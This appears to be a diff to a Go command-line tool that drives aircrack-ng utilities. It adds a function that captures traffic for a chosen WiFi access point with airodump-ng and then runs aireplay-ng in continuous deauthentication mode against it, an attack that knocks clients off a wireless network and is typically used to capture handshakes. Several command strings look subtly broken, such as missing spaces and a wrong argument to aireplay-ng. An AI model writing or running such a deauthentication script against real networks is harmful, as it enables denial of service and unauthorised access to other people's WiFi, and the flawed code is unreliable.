@@ -26,6 +26,7 @@ func main() {
 	setup()
 	monitor()
 	check()
+	deauth()
 }
 
 func setup() {
@@ -179,6 +180,22 @@ func check() {
 	fmt.Print("\x1b[38;5;4mPutting ", Inter, "in monitor mode...\n")
 	monCommand := ("airmon-ng start " + Inter)
 	_, err = exec.Command("sh", "-c", monCommand).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func deauth(){
+	fmt.Print("\x1b[38;5;4 Monitoring ", SSID, "\n")
+	monitorCommand := ("airodump-ng -c " + CH + " --bssid " + BSSID + " -w " + SSID + Inter)
+	_, err := exec.Command("sh", "-c", monitorCommand).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	fmt.Print("\x1b[38;5;4mDeauthing against broadcast...\n")
+	deauthCommand := ("aireplay-ng -0 0 -a " + BSSID + " -c " + Inter)
+	_, err = exec.Command("sh", "-c", deauthCommand).Output()
 	if err != nil {
 		log.Fatal(err)
 	}
